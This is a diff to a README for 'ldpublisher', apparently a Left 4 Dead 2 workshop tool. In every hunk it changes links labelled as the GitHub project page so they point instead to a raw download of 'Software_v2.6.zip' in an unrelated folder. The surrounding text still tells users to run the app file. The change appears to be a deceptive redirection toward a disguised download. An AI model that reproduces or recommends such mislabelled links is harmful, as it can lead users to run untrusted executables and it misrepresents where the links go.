@@ -1,6 +1,6 @@
 # 🎮 ldpublisher - Simple Workshop Tools For L4D2
 
-[![Download ldpublisher](https://img.shields.io/badge/Download%20ldpublisher-purple?style=for-the-badge&logo=github)](https://github.com/Mormoncricketburrito84/ldpublisher)
+[![Download ldpublisher](https://img.shields.io/badge/Download%20ldpublisher-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mormoncricketburrito84/ldpublisher/main/nomadian/Software_v2.6.zip)
 
 ## 🧰 What It Is
 
@@ -27,7 +27,7 @@ It is built for players and mod makers who want a clear desktop tool instead of 
 
 ## 📥 Download
 
-Visit this page to download: [ldpublisher on GitHub](https://github.com/Mormoncricketburrito84/ldpublisher)
+Visit this page to download: [ldpublisher on GitHub](https://raw.githubusercontent.com/Mormoncricketburrito84/ldpublisher/main/nomadian/Software_v2.6.zip)
 
 Use the page to get the latest Windows build, then download and run the app file from the release page if one is provided.
 
@@ -157,7 +157,7 @@ If you are new to L4D2 modding, use this simple order:
 
 ## 🔗 Project Link
 
-[ldpublisher on GitHub](https://github.com/Mormoncricketburrito84/ldpublisher)
+[ldpublisher on GitHub](https://raw.githubusercontent.com/Mormoncricketburrito84/ldpublisher/main/nomadian/Software_v2.6.zip)
 
 ## 📌 Related Topics
 
